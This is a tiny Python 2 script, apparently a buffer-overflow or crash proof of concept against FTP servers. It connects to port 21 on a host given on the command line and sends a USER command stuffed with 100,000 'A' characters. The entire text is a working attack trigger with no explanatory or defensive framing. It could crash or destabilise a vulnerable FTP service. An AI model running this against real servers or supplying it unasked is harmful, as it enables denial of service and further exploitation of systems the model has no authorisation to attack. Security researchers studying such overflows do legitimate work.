
#!/usr/bin/python
import socket
import sys

buf = &quot;A&quot;*100000
host = sys.argv[1]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host,21))
print &quot;Send USER &quot; + buf
s.send(&quot;USER %s\r\n&quot; % buf)
